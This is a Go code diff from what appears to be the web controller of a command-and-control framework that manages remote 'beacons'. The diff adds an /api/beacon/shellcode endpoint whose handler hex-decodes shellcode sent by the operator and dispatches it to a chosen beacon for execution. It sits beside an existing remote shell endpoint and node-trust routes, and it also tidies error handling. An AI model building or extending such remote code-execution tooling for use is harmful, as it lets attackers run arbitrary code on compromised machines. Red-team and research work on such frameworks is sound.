@@ -111,6 +111,7 @@ func newWeb(ctx *Ctrl, config *Config) (*web, error) {
 	router.POST("/api/node/trust", wh.handleTrustNode)
 	router.POST("/api/node/connect", wh.handleConnectNodeListener)
 	router.POST("/api/beacon/shell", wh.handleShell)
+	router.POST("/api/beacon/shellcode", wh.handleShellcode)
 
 	// configure HTTPS server
 	listener, err := net.Listen(cfg.Network, cfg.Address)
@@ -284,7 +285,6 @@ func (wh *webHandler) handleShell(w hRW, r *hR, p hP) {
 		return
 	}
 
-	fmt.Println(beaconGUIDSlice)
 	err = beaconGUID.Write(beaconGUIDSlice)
 	if err != nil {
 		fmt.Println("2", err)
@@ -300,6 +300,41 @@ func (wh *webHandler) handleShell(w hRW, r *hR, p hP) {
 		&beaconGUID, messages.CMDBShell, &shell, true)
 	if err != nil {
 		fmt.Println("2", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+}
+
+func (wh *webHandler) handleShellcode(w hRW, r *hR, p hP) {
+	_ = r.ParseForm()
+	beaconGUID := guid.GUID{}
+
+	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
+	if err != nil {
+		fmt.Println("1", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+	err = beaconGUID.Write(beaconGUIDSlice)
+	if err != nil {
+		fmt.Println("2", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+	sc, err := hex.DecodeString(r.FormValue("shellcode"))
+	if err != nil {
+		fmt.Println("3", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+	shellcode := messages.ExecuteShellCode{
+		Method:    r.FormValue("method"),
+		ShellCode: sc,
+	}
+	err = wh.ctx.sender.SendToBeacon(context.Background(),
+		&beaconGUID, messages.CMDBExecuteShellCode, &shellcode, true)
+	if err != nil {
+		fmt.Println("4", err)
 		_, _ = w.Write([]byte(err.Error()))
 		return
 	}
